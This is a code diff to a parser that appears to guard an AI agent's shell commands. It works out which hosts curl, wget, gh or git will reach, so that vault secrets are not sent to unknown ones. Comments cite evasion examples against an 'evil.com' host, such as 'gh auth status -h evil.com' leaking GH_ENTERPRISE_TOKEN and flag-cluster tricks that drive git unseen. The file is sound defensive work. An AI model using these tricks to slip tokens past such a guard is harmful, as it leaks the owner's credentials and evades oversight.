@@ -306,7 +306,30 @@ const KNOWN_TOOLS = Object.freeze([
   { name: 'curl', proxyEnv: true, bareHosts: 'all', globs: true, urlFlags: ['--url'], blindPrefixes: ['--expand-'], valueFlags: ['-x', '--proxy', '--preproxy', '--resolve', '--connect-to', '--socks4', '--socks4a', '--socks5', '--socks5-hostname', '--doh-url', '-K', '--config', ...CURL_VALUE_FLAGS], keyed: ['-x', '--proxy', '--preproxy', '--resolve', '--connect-to', '--socks4', '--socks4a', '--socks5', '--socks5-hostname', '--doh-url', '--unix-socket', '--abstract-unix-socket', '--dns-servers', '--alt-svc', '--interface'], configFlags: ['-K', '--config'], fileFlags: ['--cacert', '--capath', '-E', '--cert', '--key', '--netrc-file', '--hsts', '--etag-save', '--etag-compare'] },   // round 3: a flag that redirects the connection off the URL's host (--alt-svc / --interface) is keyed; a value that is an agent-writable FILE (cert / ca / netrc / hsts cache) is a config class — blind unless it is the vault's own $VAULT_FILE
   { name: 'wget', proxyEnv: true, bareHosts: 'all', prefixOpts: true, valueFlags: WGET_VALUE_FLAGS, keyed: ['-e', '--execute', '-B', '--base', '--bind-address', '--use-askpass'], configFlags: ['--config', '-i', '--input-file', '--input-metalink'], fileFlags: ['--ca-certificate', '--certificate', '--private-key', '--load-cookies', '--save-cookies'] },   // round 3 (m2): --input-metalink fetches every URL in its file (like -i); a cert / cookie file the agent writes is a config class
   { name: 'http', aka: ['https', 'httpie'], proxyEnv: true, bareHosts: 'first', valueFlags: HTTPIE_VALUE_FLAGS, keyed: ['--proxy'] },
-  { name: 'gh', hosts: ['api.github.com', 'github.com'], hostEnv: ['GH_HOST'], sub: 2, proxyEnv: true, valueFlags: ['-R', '--repo', '--hostname'], hostFlags: ['--hostname'], repoFlags: ['-R', '--repo'], repoEnv: ['GH_REPO'], blindSubs: [['repo', 'clone'], ['repo', 'fork'], ['repo', 'sync'], ['pr', 'checkout'], ['extension', 'install'], ['extension', 'upgrade']], blindFlagSubs: [{ sub: ['pr', 'merge'], longs: ['--delete-branch'], shorts: ['-d'] }, { sub: ['repo', 'create'], longs: ['--push', '--clone'], shorts: ['-c'] }], repoSpecSubs: [['repo', 'archive'], ['repo', 'clone'], ['repo', 'delete'], ['repo', 'edit'], ['repo', 'fork'], ['repo', 'set-default'], ['repo', 'sync'], ['repo', 'unarchive'], ['repo', 'view']], passDashes: true },   // round 3: gh extension install/upgrade runs code; a verb+flag that drives git (pr merge --delete-branch, repo create --push/--clone) is blind; round 4: every gh repo verb whose first positional is <repository> (archive/clone/delete/edit/fork/set-default/sync/unarchive/view, pinned vs gh repo --help) reads positionals[0] as HOST/OWNER/REPO (gh api <path> is a path under the default host, never a host); a git-driving bool flag matches in every pflag spelling via boolFlagOn   // round 2b: these drive `git` (the project's .git/config + hooks, like the git row); args after `--` go to git
+  { name: 'gh', hosts: ['api.github.com', 'github.com'], hostEnv: ['GH_HOST'], sub: 2, proxyEnv: true, valueFlags: ['-R', '--repo', '--hostname'], hostFlags: ['--hostname'], repoFlags: ['-R', '--repo'], repoEnv: ['GH_REPO'], blindSubs: [['repo', 'clone'], ['repo', 'fork'], ['repo', 'sync'], ['pr', 'checkout'], ['extension', 'install'], ['extension', 'upgrade']], blindFlagSubs: [{ sub: ['pr', 'merge'], longs: ['--delete-branch'], shorts: ['-d'] }, { sub: ['repo', 'create'], longs: ['--push', '--clone'], shorts: ['-c'] }], grammar: {
+      "auth login": {"value":["--git-protocol","--hostname","--scopes","-h","-p","-s"],"bool":["--clipboard","--help","--insecure-storage","--skip-ssh-key","--web","--with-token","-c","-w"],"spec":0,"host":"-h"},
+      "auth logout": {"value":["--hostname","--user","-h","-u"],"bool":["--help"],"spec":0,"host":"-h"},
+      "auth refresh": {"value":["--hostname","--remove-scopes","--scopes","-h","-r","-s"],"bool":["--clipboard","--help","--insecure-storage","--reset-scopes","-c"],"spec":0,"host":"-h"},
+      "auth setup-git": {"value":["--hostname","-h"],"bool":["--force","--help","-f"],"spec":0,"host":"-h"},
+      "auth status": {"value":["--hostname","--jq","--json","--template","-h"],"bool":["--active","--help","--show-token","-a","-t"],"spec":0,"host":"-h"},
+      "auth switch": {"value":["--hostname","--user","-h","-u"],"bool":["--help"],"spec":0,"host":"-h"},
+      "auth token": {"value":["--hostname","--user","-h","-u"],"bool":["--help"],"spec":0,"host":"-h"},
+      "extension install": {"value":["--pin"],"bool":["--force","--help"],"spec":1,"host":null},
+      "label clone": {"value":["--repo","-R"],"bool":["--force","--help","-f"],"spec":1,"host":null},
+      "pr merge": {"value":["--author-email","--body","--body-file","--match-head-commit","--repo","--subject","-A","-F","-R","-b","-t"],"bool":["--admin","--auto","--delete-branch","--disable-auto","--help","--merge","--rebase","--squash","-d","-m","-r","-s"],"spec":0,"host":null},
+      "repo archive": {"value":[],"bool":["--help","--yes","-y"],"spec":1,"host":null},
+      "repo clone": {"value":["--upstream-remote-name","-u"],"bool":["--help","--no-upstream"],"spec":1,"host":null},
+      "repo create": {"value":["--description","--gitignore","--homepage","--license","--remote","--source","--team","--template","-d","-g","-h","-l","-p","-r","-s","-t"],"bool":["--add-readme","--clone","--disable-issues","--disable-wiki","--help","--include-all-branches","--internal","--private","--public","--push","-c"],"spec":0,"host":null},
+      "repo delete": {"value":[],"bool":["--help","--yes"],"spec":1,"host":null},
+      "repo edit": {"value":["--add-topic","--default-branch","--description","--homepage","--remove-topic","--squash-merge-commit-message","--visibility","-d","-h"],"bool":["--accept-visibility-change-consequences","--allow-forking","--allow-update-branch","--delete-branch-on-merge","--enable-advanced-security","--enable-auto-merge","--enable-discussions","--enable-issues","--enable-merge-commit","--enable-projects","--enable-rebase-merge","--enable-secret-scanning","--enable-secret-scanning-push-protection","--enable-squash-merge","--enable-wiki","--help","--template"],"spec":1,"host":null},
+      "repo fork": {"value":["--fork-name","--org","--remote-name"],"bool":["--clone","--default-branch-only","--help","--remote"],"spec":1,"host":null},
+      "repo set-default": {"value":[],"bool":["--help","--unset","--view","-u","-v"],"spec":1,"host":null},
+      "repo sync": {"value":["--branch","--source","-b","-s"],"bool":["--force","--help"],"spec":1,"host":null},
+      "repo unarchive": {"value":[],"bool":["--help","--yes","-y"],"spec":1,"host":null},
+      "repo view": {"value":["--branch","--jq","--json","--template","-b","-q","-t"],"bool":["--help","--web","-w"],"spec":1,"host":null},
+      "skill install": {"value":["--agent","--dir","--pin","--scope"],"bool":["--all","--allow-hidden-dirs","--force","--from-local","--help","--upstream","-f"],"spec":1,"host":null},
+      "skill preview": {"value":[],"bool":["--allow-hidden-dirs","--help"],"spec":1,"host":null},
+    }, passDashes: true },   // round 3: gh extension install/upgrade runs code; a verb+flag that drives git (pr merge --delete-branch, repo create --push/--clone) is blind; round 5: the gh flag knowledge is GENERATED from gh's own --help per verb (scripts/gen-gh-grammar.mjs → `grammar`; test-vault-run-model ⑤c re-runs the same parse against the live gh and diffs — a verb / value flag / bool / positional shape / hostname short drift is RED by name). shapeOf reads it: a value flag consumes its argument in ANY spelling so it is not misread as the <...repository> positional (repo edit -d x evil.com/o/r), a `spec` verb reads positionals[0] as HOST/OWNER/REPO (the table caught skill install/preview + label clone, not only repo's verbs; gh api <path> stays a path), a `host` short is --hostname (gh auth status -h evil.com), and a cluster's =value binds to the LAST letter only so an earlier git-driving bool is still set true (gh pr merge -dm=false). gh api <path> is a path under the default host, never a host   // round 2b: these drive `git` (the project's .git/config + hooks, like the git row); args after `--` go to git
   { name: 'git', sub: 1, scpLike: true, proxyEnv: true, confDest: true, valueFlags: ['-C', '-c', '--git-dir', '--work-tree', '--namespace', '--config-env'], keyed: ['-c', '--config-env'] },
   { name: 'aws', hosts: ['*.amazonaws.com'], sub: 2, proxyEnv: true, valueFlags: ['--profile', '--region', '--output'] },
   { name: 'gcloud', hosts: ['*.googleapis.com'], sub: 3, proxyEnv: true, valueFlags: ['--project', '--account', '--format', '--configuration'] },
@@ -498,12 +521,20 @@ function conninfoUriBlind(text) { const m = CONNINFO_URI.exec(String(text)); if 
 /** round 4: is a boolean flag present in its TRUE sense in any pflag spelling — the long form, --flag=true (not =false / =0),
  *  a short letter alone, a short letter inside a cluster of boolean letters (-dm / -md), or -x=true? gh's git-driving flags
  *  spell short aliases (pr merge --delete-branch / -d; repo create --clone / -c, --push). */
-function boolFlagOn(argv, longs, shorts) {
+function boolFlagOn(argv, longs, shorts, grammar) {
+  const valueShorts = new Set(((grammar && grammar.value) || []).filter((f) => /^-[A-Za-z]$/.test(f)));   // round 5: the verb's value-taking short flags, from the generated grammar
   const truthy = (val) => val == null || !/^(?:0|f|false)$/i.test(val);
   for (const a of argv.slice(1)) {
     if (a === '--') break;
     if (a.startsWith('--') && a.length > 2) { const eq = a.indexOf('='); if (longs.includes(eq > 0 ? a.slice(0, eq) : a) && truthy(eq > 0 ? a.slice(eq + 1) : null)) return true; }
-    else if (a[0] === '-' && a.length > 1 && a[1] !== '-') { const eq = a.indexOf('='), letters = eq > 0 ? a.slice(1, eq) : a.slice(1), val = eq > 0 ? a.slice(eq + 1) : null; for (const c of letters) if (shorts.includes('-' + c) && truthy(val)) return true; }
+    else if (a[0] === '-' && a.length > 1 && a[1] !== '-') {
+      const eq = a.indexOf('='), letters = eq > 0 ? a.slice(1, eq) : a.slice(1), clVal = eq > 0 ? a.slice(eq + 1) : null;   // round 5: in a cluster, pflag binds `=value` to the LAST letter only
+      for (let i = 0; i < letters.length; i++) {
+        const sh = '-' + letters[i];
+        if (valueShorts.has(sh)) break;   // a value short takes the REST of the cluster as its value — the later letters are not flags (pflag)
+        if (shorts.includes(sh) && truthy(i === letters.length - 1 ? clVal : null)) return true;   // a boolean git-driving short: set true (NoOptDefVal) unless it is the LAST letter and carries =false/=0
+      }
+    }
   }
   return false;
 }
@@ -511,7 +542,9 @@ function boolFlagOn(argv, longs, shorts) {
  *  WHOLE value is a $VAULT_FILE{…} placeholder (for -E / --cert an optional :password after it — nothing else) whose entry the
  *  agent did NOT author: an owner-store entry. A template (--file NAME=@…, the agent's own text) or an agent-scoped entry (the
  *  agent put or minted the bytes) is the agent's own file ⇒ blind as any other config file; a $VAULT_FILE{…} inside a longer
- *  path (./x/$VAULT_FILE{o}/ca.pem, $VAULT_FILE{o}/../ca.pem) is not a whole placeholder ⇒ blind. */
+ *  path (./x/$VAULT_FILE{o}/ca.pem, $VAULT_FILE{o}/../ca.pem) is not a whole placeholder ⇒ blind. ROUND 5 (say the reason): a
+ *  MINTED own value is random printable text, never a usable cert / key / CA, so blinding it loses nothing legal — the exemption
+ *  admits ONLY an owner-store entry, and an agent-scoped placeholder (put OR minted) blinds. */
 function fileFlagExempt(f, v, run) {
   const re = f === '-E' || f === '--cert' ? /^\$VAULT_FILE\{([^}]*)\}(?::.*)?$/ : /^\$VAULT_FILE\{([^}]*)\}$/;
   const m = re.exec(String(v));
@@ -537,7 +570,10 @@ function shapeOf(run) {
   const flags = new Set(), sub = [], args = [], positionals = [], keyed = [], valued = [];
   let script = null, afterDashes = false, valueNext = null, configFile = false, unread = false;
   const isKeyed = (f) => !!(row && (row.keyed || []).includes(f));
-  const takes = row ? [...(row.valueFlags || []), ...(row.hostFlags || []), ...(row.configFlags || []), ...(row.keyed || [])] : [];   // the flags that take a value
+  const ghSub = [];   // round 5: gh's grammar is PER VERB — pre-scan the leading subcommand words (gh wants the command first) so a value flag's argument is consumed, not misread as the <repository> positional
+  if (row && row.grammar) for (const a of argv.slice(1)) { if (a[0] === '-' || ghSub.length >= (row.sub || 0)) break; ghSub.push(a); }
+  const vg = row && row.grammar ? row.grammar[ghSub.join(' ')] || null : null;   // the generated grammar for THIS gh verb (null = a verb the table does not carry)
+  const takes = row ? [...(row.valueFlags || []), ...(row.hostFlags || []), ...(row.configFlags || []), ...(row.keyed || []), ...(vg ? vg.value : [])] : [];   // the flags that take a value (+ gh's per-verb value flags)
   if (kind !== 'tool') script = JSON.stringify(argv.slice(1));
   else for (const a of argv.slice(1)) {
     if (!afterDashes && a === '--') { afterDashes = true; flags.add('--'); continue; }
@@ -571,16 +607,17 @@ function shapeOf(run) {
     const many = (v) => String(v).split(',').map((h) => normHost(h.trim()));   // libpq takes a host LIST (PGHOST=h1,h2 · -h h1,h2)
     if (row.scpLike) for (const a of positionals) { const m = /^(?:[\w.+-]+@)?([A-Za-z0-9.-]{2,253}):(?!\/\/)/.exec(a); if (m && !/^[A-Za-z]$/.test(m[1])) hosts.add(normHost(m[1])); }
     if (row.sshTarget && positionals.length) { const m = /^(?:[\w.+-]+@)?([A-Za-z0-9.-]{1,253})$/.exec(positionals[0]); if (m) hosts.add(normHost(m[1])); }
-    if (row.hostFlags) for (const v of vals(row.hostFlags)) if (!/^[a-z][a-z0-9+.-]{0,31}:\/\//i.test(v)) many(v).forEach((h) => hosts.add(h));   // -h x · --host=x · -hx (round 2); a URL value (kubectl -s https://…) was read above
+    const hostFlagList = [...(row.hostFlags || []), ...(vg && vg.host ? [vg.host] : [])];   // round 5: -h is --hostname only under the verb that defines it (gh auth status -h evil.com sends GH_ENTERPRISE_TOKEN there) — the grammar carries the per-verb short
+    if (hostFlagList.length) for (const v of vals(hostFlagList)) if (!/^[a-z][a-z0-9+.-]{0,31}:\/\//i.test(v)) many(v).forEach((h) => hosts.add(h));   // -h x · --host=x · -hx (round 2); a URL value (kubectl -s https://…) was read above
     if (row.scriptFlags) for (const v of vals(row.scriptFlags)) if (row.escapes.test(v)) unread = true;   // round 2: a client's shell escape — where it sends is the shell's
     if (row.registry) for (const a of positionals) { const h = a.split('/')[0]; if (HOSTNAME.test(h.replace(/:\d+$/, ''))) hosts.add(normHost(h)); }
     if (row.hostEnv) for (const v of envs(row.hostEnv)) many(v).forEach((h) => hosts.add(h));
     if (row.bareHosts) for (const a of [...(row.bareHosts === 'first' ? httpieTarget(positionals) : positionals), ...vals(row.urlFlags)]) { if (String(a).startsWith('@')) { unread = true; continue; } const t = targetOf(a, !!row.globs, row.bareHosts === 'all'); if (t.host) hosts.add(t.host); if (t.unread) unread = true; }   // round 2b: `--url @file` / `@urls.txt` reads the real targets from a file
     if (row.conninfo) for (const a of [...argv.slice(1), ...vals(['-d', '--dbname'])]) { conninfoHosts(a).forEach((h) => hosts.add(h)); if (conninfoUriBlind(a)) unread = true; }
-    const repoSpec = row.repoSpecSubs && row.repoSpecSubs.some((b) => b.every((w, i) => sub[i] === w)) && positionals.length ? [positionals[0]] : [];   // round 3 (fix 5): only a repo-spec verb reads a positional as a repo spec
+    const repoSpec = vg && vg.spec && positionals.length ? [String(positionals[0]).replace(/^[a-z][a-z0-9+.-]{0,31}:\/\//i, '')] : [];   // round 5: the grammar's spec verbs read positionals[0] as HOST/OWNER/REPO (a scheme is stripped — gh's ghrepo.FromFullName takes a URL form too); the generated table caught skill install/preview + label clone, not only repo's verbs
     if (row.repoFlags) for (const v of [...vals(row.repoFlags), ...envs(row.repoEnv), ...repoSpec]) { const p = String(v).split('/'); if (p.length >= 3) { const h = normHost(p[0]); if (h) hosts.add(h); else unread = true; } }   // gh -R HOST/OWNER/REPO (round 2b: an IP / a port / a trailing dot routes too — no HOSTNAME gate; gh sends GH_ENTERPRISE_TOKEN to a non-github host)
     if (row.blindSubs && row.blindSubs.some((b) => b.every((w, i) => sub[i] === w))) unread = true;   // round 2b: a subcommand that drives git (gh repo clone / pr checkout) — the project's config / hooks decide where it goes
-    if (row.blindFlagSubs) for (const b of row.blindFlagSubs) if (b.sub.every((w, i) => sub[i] === w) && boolFlagOn(argv, b.longs || [], b.shorts || [])) unread = true;   // round 3/4: a verb that drives git only with a bool flag (gh pr merge --delete-branch/-d, repo create --push/--clone/-c) — boolFlagOn matches every pflag spelling (long, =true not =false, a short alone or in a cluster, -x=true)
+    if (row.blindFlagSubs) for (const b of row.blindFlagSubs) if (b.sub.every((w, i) => sub[i] === w) && boolFlagOn(argv, b.longs || [], b.shorts || [], vg)) unread = true;   // round 3/4/5: a verb that drives git only with a bool flag (gh pr merge --delete-branch/-d, repo create --push/--clone/-c) — boolFlagOn matches every pflag spelling (long, =true not =false, a short alone or in a cluster, -x=true); round 5: a cluster's =value binds to the LAST letter only (the grammar says which letters take a value)
     if (row.fileFlags) for (const [f, v] of valued) if (row.fileFlags.includes(f) && !fileFlagExempt(f, v, run)) configFile = true;   // round 3/4: a cert / config FILE the agent can write ⇒ config class — blind unless the WHOLE value is a $VAULT_FILE placeholder (fileFlagExempt) for an owner-store entry (a template / an agent-put entry / a substring blinds)
     if (row.passDashes && flags.has('--')) unread = true;   // round 2b: gh passes args after `--` to git
     if ([...argv.slice(1), ...run.plainEnv.map((e) => e.value), ...run.files.map((f) => f.text || '')].some(blindAuthority)) unread = true;   // round 2b (HIGH-1): a URL authority our host read cannot be trusted for
